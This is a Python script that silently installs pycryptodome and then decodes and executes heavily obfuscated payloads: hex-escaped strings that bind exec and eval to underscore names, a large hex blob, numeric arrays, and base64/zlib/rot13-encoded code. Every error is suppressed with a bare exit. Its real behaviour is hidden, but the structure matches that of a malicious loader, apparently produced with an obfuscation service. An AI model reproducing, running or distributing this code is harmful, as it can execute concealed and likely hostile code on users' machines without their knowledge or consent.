import random ,base64,codecs,zlib,sys;py=""
import warnings, subprocess

def check_installation(package):
    try:
        subprocess.run(["pip3", "show", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True 
    except subprocess.CalledProcessError:
        return False

package_name = "pycryptodome"

warnings.filterwarnings("ignore", category=Warning)

if not check_installation(package_name):
    subprocess.run(["pip3", "install", package_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    sys.setrecursionlimit(1000000000) 

    pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'SystemExit | type','exec':'d2toBscafiHysoXq0pSXOvrmYOvL1rrnAZ2RpjUrk6MlX9bovxKh4DxO1hJgMWd5kC4E30XV0bEX3A5L','eval': bytes.fromhex('''1ba2855682e4b790dc970d7841ce6ad94344fde46674aff728393283f75ac551ad6810952cca325545c64102a962f426c36e1b2e71527e613761dc59f8603ba43a8886efbd9cb7d58fb84f5ef809ad85dbfb7d7cbe6aa06fd3afbb1ab5817b1ee3c46de127d4033b11550f5c93f465be5049067071c3763465e62af393956b2666563968bd124e60a3d697a2c2fdbe3d3a4d880ff4a3375d303e9f58634cab703c525eb36ca15c6db081d7094800871a5151794acb13bb83312da4c3774fadc644a7e6d4a0dd1da113eff8d10b4a40af36af846a99ec42a5dd5f130c80cd9dfe3f7c8d0c47e1acb40ea158693ecc26b92639cf888802ae194f681cde7992b1d61cf39c539a9401f2482786dc36e10e9e7c1da1ce09ad7bf5444d64b1c9d25e4c2ab45a23134b27517b40fb291ec876169d012b780931bcc979d26b197b0cadf0a7b0a505e6888b16f3abcc5b907808741fa80a4e9db3066700bfe6c138ab4aacd8b11914fa3891d0e712eda08bb53f48ee84bd118c1ce4d2894b4c54c9b5edaee69cf95bedc86bf54c980ebe0ded4107a0f296d173f4423aa4a1c47a9f07e9b8fd0acb49f4bff268c2e3b16f400b4fda0c4179b274facb26595d943f0c409b975bde99842add862aaa0b28bf8834f34f025fa809e339333959972ee2e4807ef42014616eff046b0350dbd5ffa62da6f1984443e040949299e58586ef28ba9eee55c3f8c61f5897af2f56cac89d6cbb7e13d7de18539d86027a2beea46af43754e7537400ce935cc88fa7d6e61503c6285de9acdbc0065a2d5838350fbc19df41d660f004efa64f2e3ed08ce1eca284fca3c64bcd73c08dac4f1083945f0d809fb31c219e0082d6146f26049925e3be88b20e1ed985684e5c5035d51cbf9f1025e55a460cae36f07a709e8ae8f14c86af5d48046ec831a30e2c9550c3a96163a1b8b740e9b5bee90deb51775c90ff85c3bd4644f0e1c518811febc323d54ee763186385ba6400358ed912020dea712b8258759b9a3c108e64414eea0fe48401f89e5dee22ab0b96d22b701c101fb8727d8f718b367b7ce53d38fdba7dd0ffd2181ccca6d8a84cf4a802bcdf986c510fa3f76bfc3d51ccc2ff5471de005eef656ac9fb1dd1693a9f0ee30895b059d41e1a07b6ac18748db7f31bb0ac13d22ef788bdae82f1badd44042f78d1d52c16758c540db528bb6a32f50fab974840f5a9a8a983a902da799137f70aa49b887573bfeb441f94a01a282f2d1b287e59da164844e367371f940b0722702a3bb737fa1a4cf3710d64207a2c214b0d8c0342671f1d40a54b8e1f3a42b9484c416b469a7ca209cfd45466cb0c2da500b5ac4271ff21f0cc530eb02971ad57135dd169159c6c2e1d3b152c7b13cfbd9c46069a47b44d9a580763c917d4c060ac11545429aac9ec784c8be35519794b623008bdf7e85ef79d637fa74eeba478331a7cef78af1ee671a931f284bbcb875897b6dca487107dfdc74d9cfc19a56bf0ed9f381ed2f8171b1f4bb7720f62916553ea3c0625891f81b47f9f61ce2d0229bf7a269a33849646f131afc31ebbe93daecc11bc54c41d74a58b661fcf1153641ecac1d6139cc56912adfffb24a450e542ea48a325e5e33e64609021a4941898fe19e3a5d42e2ffad85ee891719b51a9aad57c0ee0b3f67acc591f29ba8b00810762e1f7a9323cae71a329a7030f5d3253e5d1295a405a036985eada127c04054aa1636c6f6078127745b50c8000947dccd8e81873f788386a5f0cf23f8d84a069177da6fd759d9aa1fb717a9bf1d2426d6acce62320e9633e63d169624792170e3df15b6da0557f9846d0c0ae59787bd35449561b5358ef41b148840bae0fddb5e3cac7c80670df0d727a9ab9084cb7ae1890e86b43313adef9ee162cf1f3697ed3e9a6dd23c52ccd74f61172c166fbdf7605b94c7cb9c8dff02734aa3f49a0290d0585d43fe35398d084f8edd9d7026608900aa5e19bcc72a5e5571939a8c93494ca9eab3fda5fee08f51aad4152eaf4541aa3da808bc9b83e2c0126f0d61e3107ba148ed8e719cea36e7259b37db2952bbc4bc5c015b3436e69acd26f399eff63b5ae453bf37b04e3fe3ea42f8e8058fbf2c40aa88de98a79009209ac848caf1cda45bd5eb5dc5cc7cb76faf89ce5293ae445a1ecd0cfa4b669fd9f3c17aadc7ed016aa35ef99d713eff6ddff8326fff4ebe23a59e3c4b0342e06db836fcda8683ac6077ffc8fb4a1930d134fc1a22b4e557b560e9fcecb27defe9db5e28f6e0dca170b1de1bc40970998d213632db6b8182f3d4d2576fbef6318862d89fbf21272f050b14a94f0c6fd2c9bead085ac305ab7ea9218545d8da59a49fecc0b1acecd97113423946b4dab81546fb3e79eb651e1acca593aa4fef785d8b7721bd59d1365f8ab96a78a18064f19a05307e883a85ce51240c63b55d78e7a4e16b593b3ebf333134095ab9507e8432957455586e34c09496ae7296e9c99a4d8b98cca3f4727ae80dfc3ef2718a0fea4051f254b6de6c5585c88a7794d3efb7e08349c491bb7c4fe2d4ad39e8e5eab758f47714ff9ea80f2ec325ae87a2fcc29f2d59148104ab15c289ce558e688be065888936516cde13b3a51d4ad5ab29d35092203f338d88f44806946fef0204599c50f1424187d42fe7bd6572dbc5d314bbce24bdd5721a1206542e21a107931d5b8d158c06245279f658eeb3d5f29280225a836621ae92138bcbc2516c85456308288b8212de896953b3396e212138f86adde9e2ba9dbeb0b07a8e115af5d625c665b452cf5f864dfb0d1f03d09991a5a2bd8a5b74a47327b926c4b829e03c3f57037777d8060692b0f5413b021164faa16972bfdc1933fb8e7f2aa6edbfdb7088e1968330ad794'''.replace("\n","")) })

    _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

except Exception as e:
    exit()